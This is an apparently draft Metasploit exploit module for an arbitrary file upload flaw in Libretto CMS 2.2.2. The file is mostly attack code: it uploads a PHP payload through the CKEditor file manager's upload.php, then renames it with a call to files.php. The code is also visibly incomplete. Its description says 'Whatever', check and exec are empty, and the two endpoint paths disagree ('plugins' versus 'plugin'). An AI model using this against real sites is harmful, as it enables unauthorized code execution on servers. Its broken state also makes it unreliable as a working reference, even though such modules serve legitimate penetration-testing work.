##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::PhpEXE

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Libretto CMS Arbitary File Upload Vulnerability",
			'Description'    => %q{
				Whatever
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'CWH',
					'sinn3r'  #Metasploit
				],
			'References'     =>
				[
					['EDB', '26213']
				],
			'Payload'        =>
				{
					'BadChars' => "\x00"
				},
			'Platform'       => ['linux', 'php'],
			'Targets'        =>
				[
					[ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],
					[ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Jun 17 2013",
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('TARGETURI', [true, 'The base path to LibrettoCMS', '/librettoCMS_v.2.2.2/'])
				], self.class)
	end


	def peer
		"#{rhost}:#{rport}"
	end


	def check
	end


	def upload(base)
		p     = get_write_exec_payload(:unlink_self=>true)
		fname = "payload.php.doc"

		data = Rex::MIME::Message.new
		data.add_part(fname, nil, nil, "form-data; name=\"Filename\"")
		data.add_part(p, "application/octet-stream", nil, "form-data; name=\"Filedata\"; filename=\"#{fname}\"")
		data.add_part('Submit Query', nil, nil, 'form-data; name="Upload"')
		post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

		uri = normalize_uri(base, 'adm', 'ui', 'js', 'ckeditor', 'plugins', 'pgrfilemanager', 'php', 'upload.php')

		res = send_request_cgi({
			'method'   => 'POST',
			'uri'      => uri,
			'ctype'    => "multipart/form-data; boundary=#{data.bound}",
			'data'     => post_data,
			'vars_get' => {'type'=>'all files'}
		})

		return fname
	end


	def rename(base, original_fname)
		new_name = "BBBBBBBB.pdf"
		uri = normalize_uri(base, 'adm', 'ui', 'js', 'ckeditor', 'plugin', 'pgrfilemanager', 'php', 'files.php')
		res = send_request_cgi({
			'method'    => 'POST',
			'uri'       => uri,
			'vars_post' => {
				'fun'         => 'renameFile',
				'dir'         => '',
				'filename'    => original_fname,
				'newFilename' => new_name
			}
		})

		return new_name
	end


	def exec(base, payload_fname)

	end


	def exploit
		base = target_uri.path

		print_status("#{peer} - Uploading malicious file...")
		fname = upload(base)

		print_status("#{peer} - Renaming #{fname}...")
		fname = rename(base, fname)

		print_status("#{peer} - Executing #{fname}...")
		exec(base, fname)
	end
end